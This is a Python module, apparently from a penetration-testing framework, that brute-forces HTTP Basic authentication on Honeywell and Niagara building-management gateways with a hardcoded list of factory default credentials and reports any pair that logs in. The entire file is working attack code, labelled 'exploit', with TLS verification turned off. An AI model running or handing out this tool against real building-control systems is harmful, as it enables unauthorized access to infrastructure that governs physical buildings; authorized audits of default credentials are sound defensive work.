# modules/brand_honeywell/default_creds.py
import asyncio
import requests
from requests.auth import HTTPBasicAuth
from core.engine import BaseWazonModule

class WazonModule(BaseWazonModule):
    def __init__(self):
        super().__init__()
        self.name = "Honeywell & Building Gateway Credential Bruteforce"
        self.category = "exploit"
        self.description = "Performs real HTTP authentication checks against factory default administrative credentials."
        self.options = {
            "TARGET": {"value": "127.0.0.1", "required": True, "description": "Target IP address"},
            "PORT": {"value": 80, "required": True, "description": "Web port (80, 443, 8080)"}
        }

    async def execute(self, target=None):
        ip = self.options["TARGET"]["value"] if not target else target
        port = self.options["PORT"]["value"]
        url = f"http://{ip}:{port}/"
        
        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(None, self._real_bruteforce, url)

    def _real_bruteforce(self, url):
        # Liste réelle des identifiants par défaut les plus critiques en GTB
        factory_credentials = [
            ("admin", "admin"),
            ("root", "root"),
            ("supervisor", "supervisor"),
            ("administrator", "password"),
            ("niagara", "niagara"),
            ("carl", "carl")
        ]

        found_credential = None
        tested_count = 0

        for user, password in factory_credentials:
            tested_count += 1
            try:
                # Test avec authentification HTTP Basic
                response = requests.get(url, auth=HTTPBasicAuth(user, password), timeout=3, verify=False)
                
                # Si le code n'est ni un 401 Unauthorized ni un 403 Forbidden, l'accès est potentiellement ouvert
                if response.status_code == 200:
                    found_credential = f"{user}:{password}"
                    break
            except requests.exceptions.RequestException:
                continue

        if found_credential:
            return {
                "status": "success",
                "target": url,
                "vulnerable": True,
                "credentials_found": found_credential,
                "message": f"CRITICAL: Default factory credentials active ({found_credential})!"
            }
        else:
            return {
                "status": "success",
                "target": url,
                "vulnerable": False,
                "tested_pairs": tested_count,
                "message": "No standard factory credentials matched on target interface."
            }